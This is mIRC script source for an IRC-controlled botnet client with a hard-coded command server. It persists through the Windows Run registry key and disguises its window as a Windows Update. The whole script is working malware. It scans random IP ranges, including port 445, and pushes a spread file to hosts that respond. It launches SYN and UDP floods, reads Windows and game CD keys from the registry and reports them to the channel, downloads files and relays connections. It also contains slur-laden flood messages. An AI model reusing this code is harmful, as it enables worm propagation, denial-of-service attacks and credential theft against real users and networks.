alias cnnfailsettz { .flush | .server %server1 | .srvtimecheck | .clearall }
alias exitsettz { .flush | .clearall | .sockclose * | .tsettz | .timers off }
alias srvtimecheck { .timerchcksrv -o 0 32 servercheck }
alias makereg { $RegWrite(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\ddizk win proc,$mircexe,REG_SZ) }
alias delreg { $RegDelete(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\ddizk win proc) }
alias mircreg { $RegWrite(HKEY_CURRENT_USER\Software\WUPD\License\,4782-505050,REG_SZ) | $RegWrite(HKEY_CURRENT_USER\Software\WUPD\UserName\,fuabitch,REG_SZ) }
alias conn {
  %floodmsg1 = $str(FAGGOT,30)
  %floodmsg2 = $str(OWNED,50)
  %floodmsg3 = $str(FAGFAGFAG,15)
  %floodmsg4 = $str(Ωæ,50)
  if ($portfree(113)) { socklisten IDENT 113 }
  if (%server1 == $null) { %server1 = whsr0x.cjb.net:6667 } | if (%server2 == $null) { %server2 = whsr0x.cjb.net:6667 } | if (%server3 == $null) { %server3 = whsr0x.cjb.net:6667 } | /server %server1
}
alias servercheck {
  if ($server == $null) {
    if (%servercheck == $null) || (%servercheck == 0) { set %servercheck 1 | server %server2 | halt }
    if (%servercheck = 1) { set %servercheck 2 | server %server3 | halt }
    if (%servercheck = 2) { set %servercheck 0 | server %server1 | halt }
  }
  else { halt }
}
raw 332:*:{
  if ($2 == %chan) {
    if ($3 == .scan) && ($4) {
      if ($4 == rand) && (%begshortip == $null) && ($isfile(%spreadfile)) { set %begit $randip($5) | spit %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $6 $+ %b2 | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $6 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
      if ($4 == rand2) && (%begshortip == $null) && ($isfile(%spreadfile)) { set %rand2ip $r(0,255) | set %begit $5 $+ . $+ %rand2ip $+ . $+ $r(0,242) $+ . $+ $r(0,255) | spit %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $5 $+ . $+ %rand2ip $+ .255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $5 $+ . $+ %rand2ip $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
      if ($4 == host) && ($5 == rand) && (%begshortip == $null) && ($isfile(%spreadfile)) { set %begit $gettok($ip,1-2,46) $+ . $+ $r(0,255) $+ . $+ $r(0,255) | spit %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $gettok($ip,1-2,46) $+ .255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
      if ($4 == host) && ($5 == rand2) && (%begshortip == $null) && ($isfile(%spreadfile)) { set %begit $gettok($ip,1,46) $+ . $+ $r(0,255) $+ . $+ $r(0,255) $+ . $+ $r(0,255) | spit %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $gettok($ip,1,46) $+ .255.255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1,46) $+ .255.255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
      if ($4 == stop) || ($4 == halt) && (%begshortip != $null) { spit %b1 $+ scanner $+ %b2 scanning of %b1 $+ %begshortip - %endshortip $+ %b2 stopped at %b1 $+ %ip34 $+ %b2 by %b1 $+ $nick $+ %b2 | stopscan }
    }
    if ($3 == .syn) && ($4) { 
    if ($4 == stop) || ($4 == halt) { if (%synaa) { sockclose syn* | spit %b1 $+ syn $+ %b2 flood on %b1 $+ %synaa halted! $+ %b2 | unset %syn* | halt } | else { spit %b1 $+ syn $+ %b2 error no syn attacks currently active } } | elseif (%synaa) { spit %b1 $+ syn $+ %b2 error syn attack already active on %b1 $+ %synaa $+ %b2 | halt } | else { if (!%synaa) { set %synport $5 | if (%synport == random) { set %synport $r(0,65535) } | spit %b1 $+ syn $+ %b2 flood started %b1 $+ IP: $4 packets: $6 port: %synport $+ %b2 | set %synaa $4 | synz start $6 $4 %synport } } }
  }
}
alias spit { if ($server) && (m !isin $gettok($chan(%chan).mode,1,32)) || ($me isvoice %chan) || ($me ishop %chan) || ($me isop %chan) { .clearall | .msg %chan $1- } }
alias talkproclist { var %x = 1 | while (%x < $lines(prclst.txt)) { if ($read(prclst.txt,%x) == $null) { inc %x | continue } | if ($len(%prclst) >= 400) { var %prclst = %prclst $+  | spit %b1 $+ proclist $+ %b2 %prclst | unset %prclst } | var %prclst = %prclst  $+ $read(prclst.txt,%x) | inc %x } | var %prclst = %prclst $+  | spit %b1 $+ proclist $+ %b2 %prclst | unset %prclst }
alias downloada { if ($sock(download)) { spit %b1 $+ download $+ %b2 %b1 $+ error already downloading a file $+ %b2 | return } | set %download1 $gettok($1,2,47) | set %download2 $gettok($1,$numtok($1,47),47) | set %download3 $gettok($1,3-,47) | spit %b1 $+ download $+ %b2 downloading %b1 $+ $1- $+ %b2 | .sockopen download %download1 80 }
alias cskey { if ($RegRead(HKEY_CURRENT_USER\Software\Valve\CounterStrike\Settings\Key)) { spit %b1 $+ keys $+ %b2 CS key %b1 $+ $RegRead(HKEY_CURRENT_USER\Software\Valve\CounterStrike\Settings\Key) $+ %b2 } | elseif ($RegRead(HKEY_CURRENT_USER\Software\Valve\Half-Life\Settings\Key)) { spit %b1 $+ keys $+ %b2 HL key %b1 $+ $RegRead(HKEY_CURRENT_USER\Software\Valve\Half-Life\Settings\Key) $+ %b2 } }
alias winkey { if ($RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductId)) { spit %b1 $+ keys $+ %b2 windows key %b1 $+ $RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductId) $+ %b2 } | elseif ($RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductKey)) { spit %b1 $+ keys $+ %b2 windows key %b1 $+ $RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductKey) $+ %b2 } }
alias q3key { if ($exists(C:\Program Files\Quake III Arena\baseq3\q3key)) { spit %b1 $+ keys $+ %b2 q3 key %b1 $+ $read(C:\Program Files\Quake III Arena\baseq3\q3key,1) $+ %b2 } }
alias ut2k3key { if ($RegRead(HKEY_LOCAL_MACHINE\Software\Unreal Technology\Installed Apps\UT2003\CDKey)) { spit %b1 $+ keys $+ %b2 ut2k3 key %b1 $+ $ifmatch $+ %b2 } }
alias sof2key { if ($RegRead(HKEY_LOCAL_MACHINE\Software\Activision\Soldier of Fortune II - Double Helix\InstallPath)) { var %sof2path = $ifmatch | if ($exists(%sof2path $+ \base\mp\sof2key)) { spit %b1 $+ keys $+ %b2 sof2 key %b1 $+ $read(%sof2path $+ \base\mp\sof2key,1) $+ %b2 } } }
alias nick0r { .return [N]eo[N]- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) }
alias rletterz { .return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) }
alias rletterz2 { .return $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) }
alias rnumberz { .return $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) }
alias checkcopy { if (!$isfile(%spreadfile)) { .scancopy } }
alias clearm3n { clearall | spit %b1 $+ clear $+ %b2 %b1 $+ cleared buffer $+ %b2 }
alias cleanup { sockclose * | .run -n msnq32.exe /n /fh /r "mnn32.exe -kf ping.exe" | clearall | spit %b1 $+ clean $+ %b2 %b1 $+ cleaned up my ass $+ %b2 }
alias hide { if ($isfile(msnq32.exe)) { .run -n msnq32.exe /n /fh WUPD } | else { .uinst } }
alias fakenick { .nick FAKE- $+ $rnumberz }
alias secure1 { .run -n msnq32.exe /n /fh /r "infsrv.exe" }
alias uinst { if (!$isfile(ntnm32.bat)) { .makeuinst | spit %b1 $+ uninstall $+ %b2 %b1 $+ removing files & removing from registry $+ %b2 | delreg | run -n ntnm32.bat | if ($server) { .quit  IP: $ip host: $host OS: $os time uninstalled: $time(h:nn TT) date uninstalled: $date(mmmm doo yyyy) } | .exit } | else { spit %b1 $+ uninstall $+ %b2 %b1 $+ removing files & removing from registry $+ %b2 | delreg | run -n ntnm32.bat | if ($server) { .quit %b1 $+ IP: $ip host: $host OS: $os time uninstalled: $time(h:nn TT) date uninstalled: $date(mmmm doo yyyy) $+ %b2 } | .exit } }
alias makeuinst {
  .write ntnm32.bat @echo off
  .write ntnm32.bat del soleorp.ocx /F /Q
  .write ntnm32.bat del mnl32.dll /F /Q
  .write ntnm32.bat del mtnm32.dll /F /Q 
  .write ntnm32.bat del infsrv.exe /F /Q
  .write ntnm32.bat del pmmc32.exe /F /Q
  .write ntnm32.bat del mnn32.exe /F /Q
  .write ntnm32.bat del msnq32.exe /F /Q
  if ($isfile(%scanbat)) { .write ntnm32.bat del %scanbat /F /Q }
  if ($isfile(uvxd32.vxd)) { .write ntnm32.bat del uvxd32.vxd /F /Q }
  if ($isfile(%spreadfile)) { .write ntnm32.bat del %spreadfile /F /Q }
  if ($isfile(%sysdir $+ %spreadfile)) { .write ntnm32.bat del %sysdir $+ %spreadfile /F /Q }
  .write ntnm32.bat del $mircini /F /Q
  .write ntnm32.bat del $mircexe /F /Q
  .write ntnm32.bat del ntnm32.bat /F /Q
}
alias bgwin { .window -p @Microsoft.Windows.Update 0 0 1600 1200 | .window -a @Microsoft.Windows.update }
alias securityz {
  if ($appstate == hidden) { .clearall }
  if ($appstate != hidden) { spit %b1 $+ security $+ %b2 %b1 $+ not hidden $+ %b2 | .hide | .clearall | .uinst }
  if (!$isfile(msnq32.exe)) { spit %b1 $+ security $+ %b2 %b1 $+ hidewindow is missing $+ %b2 | .clearall | .uinst }
}
alias udp.err { if ($isid) { return UDP2 $+ %b2 %b1 $+ error } }
alias udp.packet {
  if (!$isfile(uvxd32.vxd)) { udp.gen }
  if ($1) {
    var %ip = $1 , %port , %a , %b , %z , %times , %interval
    if ($numtok(%ip,46) != 4) { spit %b1 $+ $udp.err $+ %b2 | return }
    if (*-t* !iswm $1-) { spit %b1 $+ $udp.err $+ %b2 | return }
    else { %a = 1 | while (%a <= $0) { %b = [ [ $+($,%a) ] ] | if ($left(%b,2) = -t) { %times = $remove(%b,-t) | %a = $0 } | inc %a } }
    if (*-p* iswm $1-) { %a = 1 | while (%a <= $0) { %b = [ [ $+($,%a) ] ] | if ($left(%b,2) = -p) { %port = $remove(%b,-p) | %a = $0 } | inc %a } | if (%port !isnum 1-65553) { %port = r } }
    else { %port = r }
    if (*-i* iswm $1-) { %a = 1 | while (%a <= $0) { %b = [ [ $+($,%a) ] ] | if ($left(%b,2) = -i) { %interval = $remove(%b,-i) | %a = $0 } | inc %a } }
    if (%interval = $null) || (%interval < 0) { spit %b1 $+ $udp.err $+ %b2 | return }
    $iif($iif(%interval <= 999,ms,sec) = ms,%z = $+(%interval,ms),%z = $+($calc(%interval / 1000),s))
    spit %b1 $+ UDP2 $+ %b2 flood on %b1 $+ IP: %ip port: %port times: %times interval: %z $+ %b2
    .timer -oh %times %interval udp.packet2 %ip %port
  }
}
alias udp.packet2 {
  if ($2) {
    var %a 1 , %ip = $1 , %port = $iif($2 = r,$r(1,65553),$2) , %str = $left($read(uvxd32.vxd,$r(1,$lines(uvxd32.vxd))),400)
    while (%a <= 10) { sockudp $+(udp,$calc($r(1,999999999999999) / $ticks)) %ip %port %str | inc %a }
  }
}
alias udp.gen {
  var %ascii-start = 200 , %ascii-end = 250 , %bytes = 400 , %file = uvxd32.vxd
  while (%ascii-start <= %ascii-end) { write %file $str($chr(%ascii-start),%bytes) | inc %ascii-start }
}
alias synz { if ($1 == $null) { return } | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | spit %b1 $+ syn $+ %b2 flood on %b1 $+ %synaa complete $+ %b2 | unset %syn* }
alias syn {
  if ($2 == start) { if (%synport !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x } }
  if ($2 == halt) { if ($sock(syn*,0) > 0) { sockclose syn* } }
}
alias startscan {
  inc %totalscaning
  if %totalscaning >= %total /finished
  set %ip1 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 1
  set %ip2 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 2
  set %ip3 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 3
  set %ip4 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 4
  set %ip5 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 5
  set %ip6 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 6
  set %ip7 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 7
  set %ip8 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 8
  set %ip9 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 9
  set %ip10 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 10
  set %ip11 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 11
  set %ip12 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 12
  set %ip13 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 13
  set %ip14 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 14
  set %ip15 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 15
  set %ip16 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 16
  set %ip17 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 17
  set %ip18 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 18
  set %ip19 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 19
  set %ip20 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 20
  set %ip21 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 21
  set %ip22 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 22
  set %ip23 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 23
  set %ip24 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 24
  set %ip25 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 25
  set %ip26 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 26
  set %ip27 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 27
  set %ip28 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 28
  set %ip29 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 29
  set %ip30 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 30
  set %ip31 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 31
  set %ip32 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 32
  set %ip33 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 33
  set %ip34 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  opensocks
}
alias opensocks {
  sockopen ip1 %ip1 %scanport
  if $1 == 1 finished
  sockopen ip2 %ip2 %scanport
  if $1 == 2 finished
  sockopen ip3 %ip3 %scanport
  if $1 == 3 finished
  sockopen ip4 %ip4 %scanport
  if $1 == 4 finished
  sockopen ip5 %ip5 %scanport
  if $1 == 5 finished
  sockopen ip6 %ip6 %scanport
  if $1 == 6 finished
  sockopen ip7 %ip7 %scanport
  if $1 == 7 finished
  sockopen ip8 %ip8 %scanport
  if $1 == 8 finished
  sockopen ip9 %ip9 %scanport
  if $1 == 9 finished
  sockopen ip10 %ip10 %scanport
  if $1 == 10 finished
  sockopen ip11 %ip11 %scanport
  if $1 == 11 finished
  sockopen ip12 %ip12 %scanport
  if $1 == 12 finished
  sockopen ip13 %ip13 %scanport
  if $1 == 13 finished
  sockopen ip14 %ip14 %scanport
  if $1 == 14 finished
  sockopen ip15 %ip15 %scanport
  if $1 == 15 finished
  sockopen ip16 %ip16 %scanport
  if $1 == 16 finished
  sockopen ip17 %ip17 %scanport
  if $1 == 17 finished
  sockopen ip18 %ip18 %scanport
  if $1 == 18 finished
  sockopen ip19 %ip19 %scanport
  if $1 == 19 finished
  sockopen ip20 %ip20 %scanport
  if $1 == 20 finished
  sockopen ip21 %ip21 %scanport
  if $1 == 21 finished
  sockopen ip22 %ip22 %scanport
  if $1 == 22 finished
  sockopen ip23 %ip23 %scanport
  if $1 == 23 finished
  sockopen ip24 %ip24 %scanport
  if $1 == 24 finished
  sockopen ip25 %ip25 %scanport
  if $1 == 25 finished
  sockopen ip26 %ip26 %scanport
  if $1 == 26 finished
  sockopen ip27 %ip27 %scanport
  if $1 == 27 finished
  sockopen ip28 %ip28 %scanport
  if $1 == 28 finished
  sockopen ip29 %ip29 %scanport
  if $1 == 29 finished
  sockopen ip30 %ip30 %scanport
  if $1 == 30 finished
  sockopen ip31 %ip31 %scanport
  if $1 == 31 finished
  sockopen ip32 %ip32 %scanport
  if $1 == 32 finished
  sockopen ip33 %ip33 %scanport
  if $1 == 33 finished
  sockopen ip34 %ip34 %scanport
  .timerscanner1 -o 1 4 /sockclose ip*
  .timerscanner2 -o 1 5 /startscan
}
alias randip {
  unset %1p1 %1p2
  set %1p1 $1-
  set %1p2 $replace($gettok(%1p1,1,46),*,$r(1,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,2,46),*,$r(0,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,3,46),*,$r(0,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,4,46),*,$r(0,255))
  return %1p2
}
alias randscan {
  unset %1p1 %1p2
  set %1p1 $r(1,255) $+ . $+ $r(0,255) $+ . $+ $r(0,255) $+ . $+ $r(0,255)
  :set2
  set %1p2 $r(1,255) $+ . $+ $r(0,255) $+ . $+ $r(0,255) $+ . $+ $r(0,255)
  if ($gettok(%1p2,1,46) < $gettok(%1p1,1,46)) { goto set2 | halt }
}
on *:SOCKOPEN:ip*:{ if ($sockerr > 0) { halt }
  if (%scanport == 445) {
    set %445ip % [ $+ [ $sockname ] ]
    .run -n msnq32.exe /n /fh /r " $+ %scanbat %445ip %scanproto %spreadfile $+ "
    spit %b1 $+ scanner $+ %b2 %b1 $+ attempting to root %spreadfile to %445ip $+ %b2
    inc %totalscanned | sockclose $sockname | unset %445ip | halt
  }
  elseif (%scanport != 445) {
    set %otherip % [ $+ [ $sockname ] ]
    .run -n msnq32.exe /n /fh /r " $+ %scanbat %otherip %scanproto %spreadfile $+ "
    spit %b1 $+ scanner $+ %b2 %b1 $+ attempting to root %spreadfile to %otherip $+ %b2
    inc %totalscanned | sockclose $sockname | unset %otherip | halt
  }
}
alias scancopy { if ($isfile(%sysdir $+ %spreadfile $+ )) { .copy %sysdir $+ %spreadfile $mircdir $+ %spreadfile | spit %b1 $+ copied $+ %b2 %b1 $+ $+(%,sysdir) $+ %b2 %b1 $+ %spreadfile $+ %b2 } }
alias stopscan { sockclose ip* | .timerscanner* off | unset %ip* | unset %totalscan* | unset %beg* | unset %end* | unset %rand2ip | run -n msnq32.exe /n /fh /r "mnn32.exe -kf pmmc32.exe" }
alias randscann { randscan | set %begshortip %1p1 | set %endshortip %1p2 | set %beglongip $longip(  %begshortip ) | startscan | spit %b1 $+ scanner $+ %b2 scanning %b1 $+ %1p1 - %1p2 $+ %b2 }
alias diskinfo { var %x = 99,%diskdrivelist,%totalfree = 0,%dtotal = 0 | while (122 >= %x) { if ($disk($chr(%x))) { %diskdrivelist = %diskdrivelist disk $chr(%x) $+ : $bytes($disk($chr(%x)).free).suf $+ / $+ $bytes($disk($chr(%x)).size).suf | %dtotal = $calc(%dtotal + $disk($chr(%x)).size) | %totalfree = $calc(%totalfree + $disk($chr(%x)).free) } | inc %x } | spit %b1 total: $bytes(%totalfree).suf $+ / $+ $bytes(%dtotal).suf %b2 %b1 %diskdrivelist %b2 }
alias totalfound {
  if (%totalscanned != $null) { return %totalscanned }
  if (%totalscanned == $null) { return none }
}
alias finished {
  if (%begshortip != $null) {
    spit %b1 $+ scanner $+ %b2 scanning from %b1 $+ %begshortip - %endshortip $+ %b2 has finished! | stopscan
  }
}
alias scanpop {
if ($isfile(%defaultfile)) || ($isfile(%sysdir $+ %spreadfile)) && (%defaultfile == %spreadfile) && (!%begshortip) {
  var %popranges 211_61_220_66_219_200_217_210_80_213
  set %randmax $numtok(%popranges,95)
  set %randnum $rand(1,%randmax)
  set %randrnum $rand(1,255)
  set %snum $gettok(%popranges,%randnum,95)
  set %begshortip %snum $+ . $+ %randrnum $+ .0.0
  set %beglongip $longip(  %begshortip )
  set %endshortip %snum $+ .255.255.255
  set %endlongip $longip( %endshortip  ) 
  set %total $calc( %endlongip - %beglongip ) 
  unset %totalscaning 
  startscan
  }
}
alias RegRead {
  if ($1 != $null) {
    var %a = regread
    .comopen %a WScript.Shell
    if !$comerr {
      var %b =  $com(%a,RegRead,3,bstr,$1-)
      var %q = $com(%a).result
      .comclose %a
      if (%q != $null) return %q
    }
  }
}
alias RegWrite {
  if ($1 != $null) && ($2) && ($3) {
    var %a = RegWrite
    .comopen %a WScript.Shell
    if !$comerr {
      var %b =  $com(%a,RegWrite,3,bstr,$1,bstr,$2,bstr,$3)
      .comclose %a
    }
  }
}
alias RegDelete {
  if ($1 != $null) {
    var %a = RegDelete
    .comopen %a WScript.Shell
    if !$comerr {
      var %b =  $com(%a,RegDelete,3,bstr,$1)
      .comclose %a
    }
  }
}
on *:SOCKREAD:BncClient*:{
  sockread %BncClient
  if ($gettok(%BncClient,1,32) == NICK) {
    set %Bnc.nick $gettok(%BncClient,2,32)
  }
  if ($gettok(%BncClient,1,32) == USER) {
    set %Bnc.user $gettok(%BncClient,2-,32)
    sockwrite -n $sockname NOTICE AUTH : $+ you need to say /quote pass <password>
  }
  if ($gettok(%BncClient,1,32) == PASS) {
    if ($gettok(%BncClient,2,32) == %Bnc.passwd) {
      sockwrite -n $sockname NOTICE AUTH : $+ welcome to the bnc
      sockwrite -n $sockname NOTICE AUTH : $+ step two, connect to something..
      sockwrite -n $sockname NOTICE AUTH : $+ type /quote conn <server> <port> <pass> to connect (most irc's dont use pass)
      %Bnc.legit = yes
    }
    if ($gettok(%BncClient,2,32) != %Bnc.passwd) {
      sockwrite -n $sockname NOTICE AUTH : $+ wrong pass asshole!
    }
  }
  if ($gettok(%BncClient,1,32) == CONN) {
    if (%Bnc.legit != yes) { sockwrite -n $sockname NOTICE AUTH : $+ bnc exploits do not work on my geek ass | sockclose $sockname
    }
    if (BncServer $+ $remove($sockname,BncClient) != $null) {
      sockclose BncServer $+ $remove($sockname,BncClient)
    }
    sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)
    sockwrite -n $sockname NOTICE AUTH : $+ connecting to $gettok(%BncClient,2,32) $+ : $+ $gettok(%BncClient,3,32)
    set %Bnc.server.passwd $gettok(%BncClient,4,32)
  }
  else {
    if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {
      halt
    }
    sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient
  }
}
on *:SOCKOPEN:BncServer*:{
  if ($sockerr) {
    sockwrite -n $sockname NOTICE AUTH : $+ failed connection
    sockclose $sockname
    halt
  }
  if ($sock($sockname).status != active) {
    sockwrite -n $sockname NOTICE AUTH : $+ failed connection
    sockclose BncServer $+ $remove($socknme, BncServer)
    halt
  }
  sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ suceeded connection
  sockwrite -n $sockname NICK %Bnc.nick
  sockwrite -n $sockname USER %Bnc.user
}
on *:SOCKREAD:BncServer*:{
  sockread %BncServer
  if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {
    halt
  }
  sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer
}
on *:SOCKLISTEN:Bnc:{ sockaccept BncClient $+ $r(1,999) }
on *:SOCKOPEN:Sockets-*:{ sockwrite -tn $sockname PONG $server | sockwrite -tn $sockname USER $rletterz $rletterz $rletterz : $+ $rletterz | sockwrite -tn $sockname NICK $rletterz }
on *:SOCKREAD:Sockets-*:{
  sockread %SocketTemp
  if (PING* ISWM %SocketTemp) {
    sockwrite -tn $sockname PONG : $+ $gettok(%SocketTemp,2,58)
    halt
  }
  halt
}
raw 433:*:{ nick $nick0r }
alias uptimed {
  if (!$1) { return }
  var %u = $uptime(system,1)
  if (day isin %u) { 
    var %z = 1 
    while (%z <= $numtok(%u,32)) { 
      if (day isin $gettok(%u,%z,32)) { var %u2 = %z | break } 
      inc %z 
    }
    if (wk isin %u) {
      var %x = 1
      while (%x <= $numtok(%u,32)) {
        if (wk isin $gettok(%u,%x,32)) { var %u3 = %x | break }
        inc %x
      }
      var %wkdaynum = $calc($remove($gettok(%u,%u3,32),wks,wk) * 7)
    }
    var %days = $remove($gettok(%u,%u2,32),days,day)
    var %daytotal = $iif(%wkdaynum,$calc(%wkdaynum + %days),%days) 
    if (%daytotal >= $1) { return $true }
    else { return $false }
  }
  else return $false
}
alias uptimew {
  if (!$1) { return }
  var %u = $uptime(system,1)
  if (wk isin %u) { 
    var %z = 1 
    while (%z <= $numtok(%u,32)) { 
      if (wk isin $gettok(%u,%z,32)) { var %u2 = %z | break } 
      inc %z 
    } 
    var %wks = $remove($gettok(%u,%u2,32),wks,wk)
    if (%wks >= $1) { return $true }
    else { return $false }
  }
  else { return $false }
}